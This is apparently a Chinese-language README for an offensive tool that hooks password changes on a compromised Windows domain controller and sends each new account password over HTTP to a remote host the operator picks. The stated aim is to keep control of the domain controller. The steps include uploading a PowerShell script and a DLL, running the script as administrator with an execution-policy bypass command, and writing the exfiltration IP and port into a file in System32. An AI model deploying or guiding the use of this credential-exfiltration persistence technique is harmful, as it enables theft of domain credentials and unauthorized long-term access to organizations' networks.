# PasswordchangeNotify
when pass change ,send the pass to remote host 
一.	简介
工具用途在于我们所控制的域控服务器在修改密码之后，会通过http传输协议发送到我们指定的服务器上，从而我们不会丧失对域控服务器的控制权限。
适用于windows server2008和windows2012（已测）.
二.	操作步骤
1.步骤1
上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll
管理员权限执行：
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
如下图所示:
 
2步骤2
在C:\Windows\System32 新建配置文件 system.ini
其中第一行是你要连接的ip地址
第二行是你所连接的远程ip地址的端口
如下图所示:
 
3步骤3
当域控管理员修改账号之后会在远程服务器的web日志中出现修改后的账号和密码
如下图所示:



